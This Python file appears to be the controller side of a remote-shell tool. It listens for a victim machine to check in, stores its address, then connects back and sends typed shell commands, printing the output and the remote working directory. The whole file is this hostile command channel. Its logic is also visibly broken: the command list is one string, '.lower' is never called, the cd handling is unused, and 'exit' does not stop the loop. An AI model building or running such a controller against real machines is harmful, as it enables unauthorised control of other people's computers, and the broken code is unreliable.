import socket

import Clients

listener = socket.socket ( socket.AF_INET , socket.SOCK_STREAM )
interpreter = socket.socket ( socket.AF_INET , socket.SOCK_STREAM )
background = socket.socket ( socket.AF_INET , socket.SOCK_STREAM )


def run_listener ( lhost: str , lport: int , name: str ) :
    print ( "Listening    lhost:" + lhost + " lport:" + str ( lport ) + " !" )
    listener.bind ( (lhost , lport) )
    listener.listen ( 1 )
    s , addr = listener.accept ()
    info_bytes = s.recv ( 4096 )
    s.shutdown ( 1 )
    Clients.Client.self ( Clients.Client , name , addr[ 0 ] , addr[ 1 ] , info_bytes.decode () )


def run_interpreter ( name: str ) :
    extra_commands = [ "exit, cd" ]
    client: Clients.Client = Clients.from_name ( name )
    ip = client.ip
    port = client.port
    print ( "Connecting   rhost:" + ip + " rport:" + str ( port ) + " !" )
    interpreter.connect ( (ip , port) )
    while True :
        cwd = interpreter.recv ( 128 )
        input_message = input ( cwd + "> " )
        if input_message == "exit" :
            interpreter.shutdown ( 1 )
        if input_message.split ()[ 0 ] == "cd" :
            cd_command = "%$%CD%$%:" + input_message.split ()[ 1 ]
        if not input_message.split ()[ 0 ].lower in extra_commands :
            interpreter.send ( input_message.encode () )
            o = interpreter.recv ( 4096 )
            print ( o.decode () )
